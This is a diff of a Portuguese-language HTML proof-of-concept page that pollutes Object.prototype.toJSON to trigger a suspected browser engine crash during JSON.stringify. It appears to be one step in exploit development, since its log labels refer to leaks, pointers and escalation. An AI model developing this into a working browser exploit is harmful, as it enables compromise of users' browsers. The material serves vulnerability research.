@@ -2,13 +2,15 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PoC Isolado v2.3j - Capturando 'this' antes de Object.keys()</title>
+    <title>PoC Isolado v2.3k - Teste 'this' Específico</title>
     <style> /* ... estilos como antes ... */ </style>
 </head>
 <body>
-    <h1>PoC Isolado v2.3j - Capturando 'this' antes de Object.keys()</h1>
-    <p>Tenta logar 'this' no console imediatamente antes de Object.keys(this) que causa o crash.</p>
-    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste Isolado v2.3j</button>
+    <h1>PoC Isolado v2.3k - Testando 'this' Específico com Object.keys</h1>
+    <p>Botões para testar JSON.stringify em diferentes objetos.</p>
+    <button onclick="runTest('root')">Testar com Objeto Raiz Sendo o Alvo</button><br>
+    <button onclick="runTest('nested')">Testar com Objeto Aninhado Sendo o Alvo</button><br>
+    <button onclick="runTest('simple_no_target')">Testar com Objeto Simples (Sem Alvo Específico no toJSON)</button><br>
     <div id="output"></div>
 
     <script>
@@ -17,17 +19,17 @@
         const generalUtils = { /* ... (código completo como antes) ... */ };
 
         const outputDivS1 = document.getElementById('output');
-        const runBtn = document.getElementById('runBtn');    
         const MEDIUM_PAUSE_S1 = 200;
+        let callCount_toJSON_k = 0;
+        let targetThisForKeys = null; // Variável para definir qual 'this' deve acionar Object.keys
 
         const logS1 = (message, type = 'info', funcName = '') => {
-            // Log primário no console do navegador, pois é mais rápido
             console.log(`[${type.toUpperCase()}] ${funcName ? '['+funcName+'] ' : ''}${message}`);
-            // Log secundário na div
             const targetDiv = document.getElementById('output');
             if (targetDiv) {
                 try {
                     const timestamp = `[${new Date().toLocaleTimeString()}]`;
+                    // ... (resto da lógica de logS1)
                     const prefix = funcName ? `[${funcName}] ` : '';
                     const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                     const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
@@ -37,99 +39,107 @@
                 } catch(e) { console.error(`Erro DENTRO de logS1 (para div):`, e); }
             }
         };
-
         const PAUSE_S1_FUNC = (ms = 50) => new Promise(r => setTimeout(r, ms));
-        
-        // Objeto de teste original do PoC v2.3 que travava
-        const originalTestObject_j = { a: 1, b: 'test_data', c: { nested: true, d: "deep_val" } };
-        let callCount_toJSON_j = 0;
 
-        const testPPJsonHijack_v23j = async () => {
-            const FNAME = 'testPPJsonHijack_v23j';
-            logS1("--- Iniciando Teste v2.3j: Capturando 'this' antes de Object.keys ---", 'test', FNAME);
-            
-            const ppKey = 'toJSON'; 
-            let originalToJSON_Descriptor_j;
-            let ppAppliedSuccessfully_j = false;
-            callCount_toJSON_j = 0;
+        // Objetos de Teste
+        const rootObject_k = { a: 1, b: 'test_data_k', c: { nested_k: true, d: "deep_val_k" } };
+        const nestedObject_k = rootObject_k.c; // Referência direta ao objeto aninhado
+        const simpleObject_k = { only_one_level: "ok" };
 
-            try {
-                originalToJSON_Descriptor_j = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-                logS1("Descrição original de toJSON obtida.", 'info', FNAME);
+        let originalToJSON_Descriptor_k; // Manter fora para restaurar corretamente
+        let ppKey = 'toJSON';
 
-                Object.prototype[ppKey] = function() { 
-                    callCount_toJSON_j++;
-                    let logPrefix = `toJSON PoC v2.3j (Chamada ${callCount_toJSON_j})`;
-                    
-                    // Log Intensivo e Imediato no CONSOLE antes de Object.keys(this)
-                    console.log(`%c${logPrefix} - PREstes a chamar Object.keys(this)!`, 'color: red; font-weight: bold;');
-                    console.log(`%c   ${logPrefix} - typeof this: ${typeof this}`, 'color: red;');
-                    if (this === null) {
-                        console.log(`%c   ${logPrefix} - this é NULL`, 'color: red;');
-                    } else {
-                        console.log(`%c   ${logPrefix} - this.constructor.name: ${this.constructor ? this.constructor.name : 'N/A'}`, 'color: red;');
-                        if (this === originalTestObject_j) console.log(`%c   ${logPrefix} - this É o objeto RAIZ`, 'color: red;');
-                        else if (this === originalTestObject_j.c) console.log(`%c   ${logPrefix} - this É o objeto ANINHADO 'c'`, 'color: red;');
-                        // Tentar inspecionar o objeto 'this' diretamente no console ANTES do Object.keys
-                        console.log(`%c   ${logPrefix} - Inspecionando 'this' diretamente:`, 'color: blue; font-weight: bold;');
-                        console.dir(this); // Tenta logar o objeto de forma interativa no console
-                    }
-                    // Fim do Log Intensivo
+        function setupPrototypePollution(testTarget) {
+            callCount_toJSON_k = 0;
+            targetThisForKeys = null; // Reseta o alvo
 
-                    let keys = [];
-                    try {
-                        // A LINHA CRÍTICA QUE CAUSA O CRASH ORIGINAL
-                        keys = Object.keys(this); 
-                        logS1(`${logPrefix} - SUCESSO: Object.keys(this) retornou [${keys.join(', ')}]`, 'good', FNAME); // Este logS1 pode não aparecer se travar
-                        console.log(`${logPrefix} - SUCESSO Object.keys(this). Chaves:`, keys);
-                        return { "toJSON_called_successfully_v23j": true, "object_keys": keys }; 
-                    } catch (e) {
-                        logS1(`${logPrefix} - ERRO em Object.keys(this): ${e.message}.`, 'error', FNAME); // Este logS1 pode não aparecer
-                        console.error(`${logPrefix} - ERRO em Object.keys(this):`, e);
-                        return { "toJSON_error_getting_keys_v23j": true, "error_message": String(e.message) };
-                    }
-                };
-                ppAppliedSuccessfully_j = true;
-                logS1("Poluição Object.prototype.toJSON APLICADA (com Object.keys).", 'good', FNAME);
-
-                logS1("Tentando JSON.stringify com originalTestObject_j... (CRASH ESPERADO AQUI)", 'critical', FNAME);
-                const result_j = JSON.stringify(originalTestObject_j); 
-                
-                // Se chegar aqui, não travou como no PoC v2.3 original
-                logS1(`JSON.stringify CONCLUÍDO (inesperado!). Resultado: ${result_j ? String(result_j).substring(0,500) : "N/A"}`, 'warn', FNAME);
-
-            } catch (e) {
-                logS1(`Erro fatal capturado em testPPJsonHijack_v23j: ${e.message}`, 'error', FNAME);
-                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', FNAME);
-                console.error("JSON.stringify Crash Test Error (v2.3j):", e);
-            } finally {
-                logS1("Entrou no finally de testPPJsonHijack_v23j.", 'info', FNAME);
-                if (ppAppliedSuccessfully_j) { 
-                    if (originalToJSON_Descriptor_j) {
-                        Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor_j);
-                    } else if (originalToJSON_Descriptor_j === undefined && Object.prototype.hasOwnProperty(ppKey)) {
-                         delete Object.prototype[ppKey];
-                    }
-                    logS1(`Object.prototype.${ppKey} restaurado.`, 'good', 'Cleanup_v23j');
-                }
+            if (testTarget === 'root') {
+                targetThisForKeys = rootObject_k;
+                logS1("Configurado para acionar Object.keys quando 'this' for rootObject_k", 'warn', 'setup');
+            } else if (testTarget === 'nested') {
+                targetThisForKeys = nestedObject_k;
+                logS1("Configurado para acionar Object.keys quando 'this' for nestedObject_k", 'warn', 'setup');
+            } else {
+                logS1("Nenhum 'this' específico alvo para Object.keys. O toJSON sempre retornará uma string simples.", 'info', 'setup');
             }
-            logS1(`--- Teste JSON.stringify v2.3j Concluído ---`, 'test', FNAME);
-        };
 
-        const runIsolatedTest = async () => {
-            if (runBtn) runBtn.disabled = true;
-            const outputDiv = document.getElementById('output');
-            if (outputDiv) outputDiv.innerHTML = '';
+            originalToJSON_Descriptor_k = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
+
+            Object.prototype[ppKey] = function() {
+                callCount_toJSON_k++;
+                let logPrefix = `toJSON PoC v2.3k (Chamada ${callCount_toJSON_k})`;
+                console.log(`%c${logPrefix} - Invocado! typeof this: ${typeof this}, constructor: ${this && this.constructor ? this.constructor.name : 'N/A'}`, "color:blue");
+
+                if (targetThisForKeys !== null && this === targetThisForKeys) {
+                    console.log(`%c${logPrefix} - 'this' É O ALVO! Tentando Object.keys(this)...`, "color:red; font-weight:bold;");
+                    logS1(`${logPrefix} - 'this' É O ALVO! Tentando Object.keys(this)...`, 'critical', 'toJSON');
+                    try {
+                        const keys = Object.keys(this);
+                        console.log(`%c${logPrefix} - Object.keys(this) SUCESSO. Chaves:`, "color:green", keys);
+                        logS1(`${logPrefix} - Object.keys(this) SUCESSO. Chaves: [${keys.join(',')}]`, 'good', 'toJSON');
+                        // Este é o retorno que suspeitamos causar o crash idx < size()
+                        return { "attempting_crash_with_keys": true, "object_keys_k": keys };
+                    } catch (e) {
+                        console.error(`${logPrefix} - ERRO em Object.keys(this) para o 'this' ALVO:`, e);
+                        logS1(`${logPrefix} - ERRO em Object.keys(this) para o 'this' ALVO: ${e.message}`, 'error', 'toJSON');
+                        return { "error_on_target_this": true, "message": String(e.message) };
+                    }
+                } else {
+                    // Para todos os outros 'this' ou se não houver alvo, retorna uma string simples para evitar recursão profunda
+                    // e para isolar o comportamento.
+                    console.log(`%c${logPrefix} - 'this' não é o alvo ou não há alvo. Retornando string simples.`, "color:orange");
+                    logS1(`${logPrefix} - 'this' não é o alvo ou não há alvo. Retornando string simples.`, 'info', 'toJSON');
+                    return "processed_non_target_this"; 
+                }
+            };
+            logS1("Poluição Object.prototype.toJSON APLICADA com lógica condicional.", 'good', 'setup');
+        }
+
+        function cleanupPrototypePollution() {
+            if (originalToJSON_Descriptor_k) {
+                Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor_k);
+            } else if (Object.prototype.hasOwnProperty(ppKey)) {
+                delete Object.prototype[ppKey];
+            }
+            logS1("Object.prototype.toJSON restaurado.", 'good', 'cleanup');
+            originalToJSON_Descriptor_k = undefined; // Garante que está limpo para a próxima execução
+            targetThisForKeys = null;
+        }
+
+        async function runTest(testType) {
+            const buttons = document.querySelectorAll('button');
+            buttons.forEach(b => b.disabled = true);
             
-            console.log("%crunIsolatedTest (v2.3j) FOI CHAMADA!", "font-weight:bold; color:green;");
-            logS1("==== INICIANDO PoC Isolado v2.3j (Capturando 'this' antes de Object.keys) ====", 'test', 'runIsolatedTest');
+            if (outputDivS1) outputDivS1.innerHTML = '';
+            logS1(`==== INICIANDO PoC Isolado v2.3k (Teste Tipo: ${testType}) ====`, 'test', 'runTest');
+
+            setupPrototypePollution(testType); // Configura o alvo para Object.keys
+
+            let objectToTest;
+            if (testType === 'root' || testType === 'nested') {
+                objectToTest = rootObject_k; // Sempre stringify o objeto raiz para testar a recursão
+            } else { // simple_no_target
+                objectToTest = simpleObject_k;
+            }
             
-            await testPPJsonHijack_v23j(); // Não chama mais simulateOOBLeakAndStoreS1
+            logS1(`Tentando JSON.stringify em: ${JSON.stringify(objectToTest).substring(0,50)}...`, 'critical', 'runTest');
+            let result_k;
+            try {
+                await PAUSE_S1_FUNC(50); // Pausa para logs aparecerem
+                result_k = JSON.stringify(objectToTest);
+                logS1(`JSON.stringify CONCLUÍDO. Resultado (parcial): ${result_k ? String(result_k).substring(0, 300) : "N/A"}`, 'good', 'runTest');
+            } catch (e) {
+                logS1(`ERRO CAPTURADO por JSON.stringify: ${e.message}`, 'error', 'runTest');
+                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', 'runTest');
+                console.error("ERRO durante JSON.stringify em runTest:", e);
+            } finally {
+                cleanupPrototypePollution();
+            }
             
             await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
-            logS1("\n==== PoC Isolado v2.3j CONCLUÍDO ====", 'test', 'runIsolatedTest');
-            if (runBtn) runBtn.disabled = false;
-        };
+            logS1(`\n==== PoC Isolado v2.3k (Teste Tipo: ${testType}) CONCLUÍDO ====`, 'test', 'runTest');
+            buttons.forEach(b => b.disabled = false);
+        }
     </script>
 </body>
 </html>
